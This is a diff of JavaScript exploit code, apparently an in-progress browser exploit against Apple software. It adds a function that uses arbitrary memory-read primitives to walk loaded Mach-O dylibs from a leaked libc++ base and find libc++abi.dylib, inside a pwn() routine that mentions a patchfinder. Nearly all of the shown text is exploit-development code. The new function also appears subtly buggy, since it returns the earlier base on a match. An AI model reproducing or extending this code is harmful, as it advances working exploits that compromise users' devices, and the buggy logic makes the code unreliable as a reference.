@@ -142,7 +142,7 @@ function get_dylib_name(macho_base) {
     var lc_cmd;
     while(true) {
         lc_cmd = read32(lc)
-        if(lc_cmd == 0xd) {
+        if(lc_cmd == 0xd) { //LC_ID_DYLIB
             // log(`[+] Found LC_ID_DYLIB at: ${lc}`);
             break;
         }
@@ -154,6 +154,27 @@ function get_dylib_name(macho_base) {
     var dylib_name_addr = Add(lc, dylib_name_offset);
     var dylib_name = readString(dylib_name_addr);
     return dylib_name;
+}
+
+function find_dylib_by_name(macho_base, name) {
+    var dylib_name = get_dylib_name(macho_base);
+    if(dylib_name == name)
+        return macho_base;
+
+    while(true) {
+        var vm_size = read64(Add(macho_base, 0x40));
+
+        var next_dylib = Add(macho_base, vm_size)
+        // log(`[+] read64 next_dylib: ${read64(next_dylib)}`);
+
+        dylib_name = get_dylib_name(next_dylib);
+        // log(`[*] dylib_name: ${dylib_name}`);
+
+        if(dylib_name.includes(name))
+            return macho_base;
+
+        macho_base = next_dylib;
+    }
 }
 
 function pwn() {
@@ -346,17 +367,8 @@ function pwn() {
     }
     log(`[+] libcpp_base: ${libcpp1_base}, try_count: ${try_count}`);
     
-    var dylib_name = get_dylib_name(libcpp1_base);
-    log(`[*] dylib_name: ${dylib_name}`);
-
-    var libcpp_vm_size = read64(Add(libcpp1_base, 0x40))
-    log(`[+] libcpp_vm_size: ${libcpp_vm_size}`);
-
-    var next_dylib = Add(libcpp1_base, libcpp_vm_size)
-    log(`[+] read64 next_dylib: ${read64(next_dylib)}`);
-
-    dylib_name = get_dylib_name(next_dylib);
-    log(`[*] dylib_name: ${dylib_name}`);
+    var dylib_base = find_dylib_by_name(libcpp1_base, "libc++abi.dylib")
+    log(`[+] dylib_base: ${dylib_base}`);
 
 
     // remove this "return" if finished patchfinder
